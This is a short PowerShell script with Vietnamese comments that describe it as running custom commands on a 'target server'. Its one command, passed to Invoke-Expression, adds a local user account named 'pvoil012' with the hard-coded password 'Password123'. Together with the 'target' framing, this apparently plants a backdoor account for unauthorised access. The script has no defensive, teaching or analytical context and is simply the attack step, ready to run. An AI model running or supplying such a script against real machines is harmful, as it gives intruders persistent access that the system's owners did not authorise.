# Script PowerShell để thực thi các lệnh tùy chỉnh trên máy chủ mục tiêu

# Lệnh PowerShell cần thực hiện

$command = "net user pvoil012 Password123 /add"

# Thực thi lệnh
Invoke-Expression -Command $command
